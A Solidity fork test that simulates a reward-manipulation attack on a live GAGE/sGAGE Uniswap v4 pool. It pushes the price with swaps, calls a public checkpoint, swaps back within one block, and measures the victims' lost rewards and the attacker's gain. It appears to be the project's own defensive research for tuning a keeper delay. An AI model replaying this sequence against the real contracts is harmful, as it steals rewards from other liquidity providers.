// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity 0.8.28;

import {Test, Vm} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {FixedPoint96} from "@uniswap/v4-core/src/libraries/FixedPoint96.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolSwapTest} from "@uniswap/v4-core/src/test/PoolSwapTest.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {PositionInfo, PositionInfoLibrary} from "@uniswap/v4-periphery/src/libraries/PositionInfoLibrary.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {LiquidityAmounts} from "@uniswap/v4-periphery/src/libraries/LiquidityAmounts.sol";
import {IAllowanceTransfer} from "permit2/src/interfaces/IAllowanceTransfer.sol";
import {LPRewards} from "../../src/token/LPRewards.sol";

/// @notice Research on the live Robinhood Chain (4663) GAGE/sGAGE pool. Baseline LP rewards are compared with the
///         rewards after a temporary price move, a public `checkpointMany` and a swap back inside one block. Both
///         branches start from the same fork block with the real positions, liquidity and contracts; every price
///         move is a real swap through the PoolManager. The only direct state write is the attacker's token
///         balance (their capital). Rewards accrued before a correction are what the correction cannot undo.
/// @dev Env: GAGE_MAINNET_RPC (required, the suite skips itself otherwise), GAGE_FORK_BLOCK (optional),
///      GAGE_ATTACK_CAPITAL_GAGE (optional, whole GAGE, default 100000), GAGE_GAS_PRICE_WEI (optional),
///      GAGE_POSITION_IDS (optional, comma-separated token ids to score when the RPC serves no wide `eth_getLogs`).
///      Run: forge test --match-path test/fork/LPRewardsManipulation.fork.t.sol -vv
///      The 10-minute delay is the keeper's swap-watch gap (SWAP_WATCH_MIN_GAP, D131): the gap must stay well under
///      the break-even this test reports.
contract LPRewardsManipulationForkTest is Test {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;
    using PositionInfoLibrary for PositionInfo;

    // launch/live/4663.json
    address internal constant GAGE = 0x7163aE1B5AeA2f09EBc609C52b4dcAc0a7a4bC2d;
    address internal constant SGAGE = 0x78c88CF8F6E612955526cEB501be82BF3279Bd5d;
    address internal constant POOL_MANAGER = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
    address internal constant POSM = 0x58daec3116aae6D93017bAAea7749052E8a04fA7;
    address internal constant LP_REWARDS = 0x57Ea11d7250C7Ee3127eFa9d0e2b114348C5ba19;
    address internal constant PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
    int24 internal constant FULL_LOWER = -887_220;
    int24 internal constant FULL_UPPER = 887_220;
    /// @dev Positions seen in LPRewards `Checkpointed` events up to SCAN_BLOCK; later ones are discovered from logs.
    uint256 internal constant SCAN_BLOCK = 58_599_621;
    uint256 internal constant PERIOD = 6 hours;
    uint256 internal constant STEP_GAGE = 2000e18;

    IPoolManager internal pm;
    IPositionManager internal posm;
    LPRewards internal rewards;
    PoolSwapTest internal router;
    IAllowanceTransfer internal permit2;
    PoolKey internal key;
    PoolId internal poolId;
    address internal attacker = makeAddr("attacker");
    uint256 internal capital;
    uint256 internal gasPrice;

    uint256[] internal ids; // scoring positions: this pool, liquidity > 0, not the seed, not a floor band
    int24[] internal lowers;
    int24[] internal uppers;
    int24 internal boundaryDown; // highest tickLower among scoring positions
    int24 internal boundaryUp; // lowest tickUpper among scoring positions
    uint256[] internal delays;

    // per-run scratch (storage to keep the stack shallow)
    uint256[] internal earned0;
    uint256 internal attackerEarned0;

    /// @dev Kept in memory: a state revert wipes the test contract's storage too.
    struct Baseline {
        uint256[] earned;
        uint256 attacker;
    }

    uint256 internal gasUnits;
    int24 internal pushedTick;
    int24 internal restoredTick;

    function setUp() public {
        string memory rpc = vm.envOr("GAGE_MAINNET_RPC", string(""));
        if (bytes(rpc).length == 0) {
            vm.skip(true);
            return;
        }
        uint256 blk = vm.envOr("GAGE_FORK_BLOCK", uint256(0));
        if (blk == 0) vm.createSelectFork(rpc);
        else vm.createSelectFork(rpc, blk);
        capital = vm.envOr("GAGE_ATTACK_CAPITAL_GAGE", uint256(100_000)) * 1e18;
        gasPrice = vm.envOr("GAGE_GAS_PRICE_WEI", uint256(183_250_000));

        pm = IPoolManager(POOL_MANAGER);
        posm = IPositionManager(POSM);
        rewards = LPRewards(LP_REWARDS);
        permit2 = IAllowanceTransfer(PERMIT2);
        key = rewards.poolKey();
        poolId = key.toId();
        require(Currency.unwrap(key.currency0) == GAGE && Currency.unwrap(key.currency1) == SGAGE, "pool order");
        router = new PoolSwapTest(pm);

        delays.push(1); // the next block: what the keeper's swap watcher delivers
        delays.push(60);
        delays.push(10 minutes); // the keeper's swap-watch gap: the longest staleness a swap-triggered checkpoint allows
        delays.push(30 minutes);
        delays.push(60 minutes);
        delays.push(PERIOD);

        _discoverPositions();

        deal(GAGE, attacker, capital + 5_000_000e18);
        deal(SGAGE, attacker, _gageToSgage(capital) + 200_000_000e18);
        vm.startPrank(attacker);
        IERC20(GAGE).approve(PERMIT2, type(uint256).max);
        IERC20(SGAGE).approve(PERMIT2, type(uint256).max);
        permit2.approve(GAGE, POSM, type(uint160).max, type(uint48).max);
        permit2.approve(SGAGE, POSM, type(uint160).max, type(uint48).max);
        IERC20(GAGE).approve(address(router), type(uint256).max);
        IERC20(SGAGE).approve(address(router), type(uint256).max);
        vm.stopPrank();

        console2.log("fork block", block.number);
        console2.log("fork timestamp", block.timestamp);
        _logInt("tick", _tick());
        console2.log("pool liquidity", pm.getLiquidity(poolId));
        console2.log("totalWeight (GAGE wei)", rewards.totalWeight());
        console2.log("emission rate (sGAGE wei/s)", rewards.emissionRate(rewards.EMISSIONS().currentEpoch()));
        console2.log("sGAGE per GAGE (1e18)", _gageToSgage(1e18));
        console2.log("attacker capital (GAGE wei)", capital);
        _logInt("boundary down", boundaryDown);
        _logInt("boundary up", boundaryUp);
    }

    // ----------------------------------------------------------------- scenarios

    function test_fork_griefOnly_pushDown() public {
        _scenario("grief only (no attacker position), push down", 0, 0, true);
    }

    function test_fork_fullRangeAttacker_pushDown() public {
        _scenario("full-range attacker, push down", FULL_LOWER, FULL_UPPER, true);
    }

    function test_fork_narrowAttackerBelow_pushDown() public {
        _scenario("narrow attacker just below, push down", boundaryDown - 60, boundaryDown, true);
    }

    function test_fork_narrowAttackerAbove_pushUp() public {
        _scenario("narrow attacker just above, push up", boundaryUp, boundaryUp + 60, false);
    }

    function _scenario(string memory name, int24 lower, int24 upper, bool pushDown) internal {
        console2.log("=====", name);
        uint256 attackerId = lower == upper ? 0 : _mint(lower, upper);
        if (attackerId != 0) {
            console2.log("attacker position", attackerId);
            console2.log("attacker weight at mint (GAGE wei)", rewards.positionState(attackerId).weight);
        }
        uint256 t0 = block.timestamp;
        _checkpointAll(attackerId);
        _snapshotEarned(attackerId, earned0);
        attackerEarned0 = _earned(attackerId);
        uint256 start = vm.snapshotState();

        // baseline: nobody manipulates, the keeper pokes at the end of the period
        vm.warp(t0 + PERIOD);
        _checkpointAll(attackerId);
        Baseline memory base = _baseline(attackerId);
        vm.revertToState(start);
        vm.warp(t0);

        // manipulation, all inside one block
        (uint256 b0, uint256 b1) = _bal(attacker);
        _manipulate(attackerId, pushDown, pushDown ? boundaryDown : boundaryUp, b0, b1);
        _logInt("  tick pushed to", pushedTick);
        _logInt("  tick restored to", restoredTick);
        for (uint256 i; i < ids.length; ++i) {
            console2.log("  stale weight", ids[i], rewards.positionState(ids[i]).weight);
        }
        if (attackerId != 0) console2.log("  stale attacker weight", rewards.positionState(attackerId).weight);
        uint256 stale = vm.snapshotState();

        for (uint256 k; k < delays.length; ++k) {
            vm.revertToState(stale);
            vm.warp(t0 + delays[k]);
            _checkpointAll(attackerId); // the correction: keeper, app visit, or the victim
            vm.warp(t0 + PERIOD);
            _checkpointAll(attackerId);
            if (attackerId != 0) _collectFees(attackerId);
            _report(attackerId, delays[k], b0, b1, base);
        }
    }

    // ----------------------------------------------------------------- the attack

    function _manipulate(uint256 attackerId, bool pushDown, int24 boundary, uint256 b0, uint256 b1) internal {
        uint256 g = gasleft();
        uint256 steps = _push(pushDown, boundary);
        pushedTick = _tick();
        vm.prank(attacker);
        rewards.checkpointMany(_all(attackerId));
        (uint256 m0, uint256 m1) = _bal(attacker);
        if (pushDown) _swap(false, m1 - b1);
        else _swap(true, m0 - b0);
        gasUnits = g - gasleft();
        restoredTick = _tick();
        console2.log("  swap steps", steps);
    }

    function _push(bool pushDown, int24 boundary) internal returns (uint256 i) {
        uint256 amountIn = pushDown ? STEP_GAGE : _gageToSgage(STEP_GAGE);
        for (; i < 2000; ++i) {
            int24 t = _tick();
            if (pushDown ? t < boundary : t >= boundary) break;
            _swap(pushDown, amountIn);
        }
        int24 t2 = _tick();
        require(pushDown ? t2 < boundary : t2 >= boundary, "could not cross the boundary");
    }

    function _swap(bool zeroForOne, uint256 amountIn) internal {
        vm.prank(attacker);
        router.swap(
            key,
            SwapParams({
                zeroForOne: zeroForOne,
                amountSpecified: -int256(amountIn),
                sqrtPriceLimitX96: zeroForOne ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
            }),
            PoolSwapTest.TestSettings({takeClaims: false, settleUsingBurn: false}),
            ""
        );
    }

    // ----------------------------------------------------------------- report

    function _baseline(uint256 attackerId) internal view returns (Baseline memory b) {
        b.earned = new uint256[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            b.earned[i] = _earned(ids[i]) - earned0[i];
        }
        b.attacker = _earned(attackerId) - attackerEarned0;
    }

    function _report(uint256 attackerId, uint256 delay, uint256 b0, uint256 b1, Baseline memory base) internal view {
        console2.log("  --- correction after seconds", delay);
        _reportVictims(base);
        (uint256 e0, uint256 e1) = _bal(attacker);
        int256 swapNet = _gageValue(int256(e0) - int256(b0), int256(e1) - int256(b1));
        console2.log("    attacker swap round trip net of own LP fee income (GAGE wei, signed)");
        console2.logInt(swapNet);
        console2.log("    attack gas units / cost (wei)", gasUnits, gasUnits * gasPrice);
        if (attackerId != 0) _reportAttacker(attackerId, base.attacker, swapNet);
    }

    function _reportVictims(Baseline memory base) internal view {
        uint256 shortfall;
        for (uint256 i; i < ids.length; ++i) {
            uint256 got = _earned(ids[i]) - earned0[i];
            uint256 s = base.earned[i] > got ? base.earned[i] - got : 0;
            shortfall += s;
            console2.log("    victim", ids[i]);
            console2.log("      baseline / attacked / shortfall (sGAGE wei)", base.earned[i], got, s);
        }
        console2.log("    victims total shortfall (sGAGE wei)", shortfall);
        console2.log("    victims total shortfall (GAGE wei at pool price)", _sgageToGage(shortfall));
    }

    function _reportAttacker(uint256 attackerId, uint256 baseA, int256 swapNet) internal view {
        uint256 gotA = _earned(attackerId) - attackerEarned0;
        uint256 excess = gotA > baseA ? gotA - baseA : 0;
        console2.log("    attacker baseline / attacked / excess (sGAGE wei)", baseA, gotA, excess);
        uint256 excessGage = _sgageToGage(excess);
        console2.log("    attacker excess (GAGE wei at pool price, before the 7-day drip)", excessGage);
        console2.log("    attacker net: excess + swap round trip (GAGE wei, signed)");
        console2.logInt(int256(excessGage) + swapNet);
    }

    // ----------------------------------------------------------------- positions

    function _discoverPositions() internal {
        uint256[14] memory known = [
            uint256(2_126_377),
            2_126_526,
            2_137_331,
            2_139_760,
            2_159_040,
            2_159_522,
            2_235_873,
            2_236_031,
            2_236_969,
            2_237_046,
            2_237_163,
            2_237_361,
            2_237_649,
            2_245_284
        ];
        uint256[] memory extra = vm.envOr("GAGE_POSITION_IDS", ",", new uint256[](0));
        uint256[] memory candidates = new uint256[](known.length + extra.length + 256);
        uint256 n;
        for (; n < known.length; ++n) {
            candidates[n] = known[n];
        }
        for (uint256 i; i < extra.length; ++i) {
            bool seen;
            for (uint256 j; j < n; ++j) {
                if (candidates[j] == extra[i]) seen = true;
            }
            if (!seen) candidates[n++] = extra[i];
        }
        bytes32[] memory topics = new bytes32[](1);
        topics[0] = keccak256("Checkpointed(uint256,uint256,uint256,bool)");
        if (block.number > SCAN_BLOCK) {
            try vm.eth_getLogs(SCAN_BLOCK + 1, block.number, LP_REWARDS, topics) returns (Vm.EthGetLogs[] memory logs) {
                for (uint256 i; i < logs.length && n < candidates.length; ++i) {
                    uint256 id = uint256(logs[i].topics[1]);
                    bool seen;
                    for (uint256 j; j < n; ++j) {
                        if (candidates[j] == id) seen = true;
                    }
                    if (!seen) candidates[n++] = id;
                }
            } catch {
                console2.log("eth_getLogs unavailable: using the scanned position list only");
            }
        }
        uint256 seed = rewards.seedTokenId();
        address floor = rewards.floor();
        boundaryDown = type(int24).min;
        boundaryUp = type(int24).max;
        int24 tick = _tick();
        for (uint256 i; i < n; ++i) {
            uint256 id = candidates[i];
            if (id == seed || posm.getPositionLiquidity(id) == 0) continue;
            (PoolKey memory k, PositionInfo info) = posm.getPoolAndPositionInfo(id);
            if (PoolId.unwrap(k.toId()) != PoolId.unwrap(poolId)) continue;
            if (IERC721(POSM).ownerOf(id) == floor) continue;
            ids.push(id);
            lowers.push(info.tickLower());
            uppers.push(info.tickUpper());
            console2.log("scoring position", id);
            _logInt("  tickLower", info.tickLower());
            _logInt("  tickUpper", info.tickUpper());
            console2.log("  weight (GAGE wei)", rewards.positionState(id).weight);
            if (info.tickLower() <= tick && info.tickLower() > boundaryDown) boundaryDown = info.tickLower();
            if (info.tickUpper() > tick && info.tickUpper() < boundaryUp) boundaryUp = info.tickUpper();
        }
        require(ids.length > 0, "no scoring positions");
    }

    function _mint(int24 lower, int24 upper) internal returns (uint256 tokenId) {
        (uint160 sqrtP, int24 tick,,) = pm.getSlot0(poolId);
        uint256 amount0 = tick < lower ? capital : (tick >= upper ? 0 : capital / 2);
        uint256 amount1 = tick >= upper ? _gageToSgage(capital) : (tick < lower ? 0 : _gageToSgage(capital / 2));
        uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(
            sqrtP, TickMath.getSqrtPriceAtTick(lower), TickMath.getSqrtPriceAtTick(upper), amount0, amount1
        );
        tokenId = posm.nextTokenId();
        bytes memory actions = abi.encodePacked(uint8(Actions.MINT_POSITION), uint8(Actions.SETTLE_PAIR));
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(
            key, lower, upper, uint256(liquidity), type(uint128).max, type(uint128).max, attacker, bytes("")
        );
        params[1] = abi.encode(key.currency0, key.currency1);
        vm.prank(attacker);
        posm.modifyLiquidities(abi.encode(actions, params), block.timestamp + 1);
    }

    /// @dev Zero-liquidity decrease: takes the swap fees the attacker's own position earned.
    function _collectFees(uint256 tokenId) internal {
        bytes memory actions = abi.encodePacked(uint8(Actions.DECREASE_LIQUIDITY), uint8(Actions.TAKE_PAIR));
        bytes[] memory params = new bytes[](2);
        params[0] = abi.encode(tokenId, uint256(0), uint128(0), uint128(0), bytes(""));
        params[1] = abi.encode(key.currency0, key.currency1, attacker);
        vm.prank(attacker);
        posm.modifyLiquidities(abi.encode(actions, params), block.timestamp + 1);
    }

    function _checkpointAll(uint256 attackerId) internal {
        rewards.checkpointMany(_all(attackerId));
    }

    function _all(uint256 attackerId) internal view returns (uint256[] memory out) {
        uint256 n = ids.length + (attackerId == 0 ? 0 : 1);
        out = new uint256[](n);
        for (uint256 i; i < ids.length; ++i) {
            out[i] = ids[i];
        }
        if (attackerId != 0) out[n - 1] = attackerId;
    }

    function _snapshotEarned(uint256, uint256[] storage into) internal {
        while (into.length > 0) into.pop();
        for (uint256 i; i < ids.length; ++i) {
            into.push(_earned(ids[i]));
        }
    }

    function _earned(uint256 tokenId) internal view returns (uint256 e) {
        if (tokenId == 0) return 0;
        (e,) = rewards.earned(tokenId);
    }

    // ----------------------------------------------------------------- math

    function _logInt(string memory label, int256 v) internal pure {
        console2.log(label);
        console2.logInt(v);
    }

    function _tick() internal view returns (int24 t) {
        (, t,,) = pm.getSlot0(poolId);
    }

    function _bal(address who) internal view returns (uint256 b0, uint256 b1) {
        b0 = IERC20(GAGE).balanceOf(who);
        b1 = IERC20(SGAGE).balanceOf(who);
    }

    /// @dev GAGE is currency0: price (sGAGE per GAGE) = sqrtP^2 / Q96^2.
    function _gageToSgage(uint256 g) internal view returns (uint256) {
        (uint160 sqrtP,,,) = pm.getSlot0(poolId);
        return Math.mulDiv(Math.mulDiv(g, sqrtP, FixedPoint96.Q96), sqrtP, FixedPoint96.Q96);
    }

    function _sgageToGage(uint256 s) internal view returns (uint256) {
        (uint160 sqrtP,,,) = pm.getSlot0(poolId);
        return Math.mulDiv(Math.mulDiv(s, FixedPoint96.Q96, sqrtP), FixedPoint96.Q96, sqrtP);
    }

    function _gageValue(int256 d0, int256 d1) internal view returns (int256) {
        uint256 conv = _sgageToGage(uint256(d1 < 0 ? -d1 : d1));
        return d0 + (d1 < 0 ? -int256(conv) : int256(conv));
    }
}
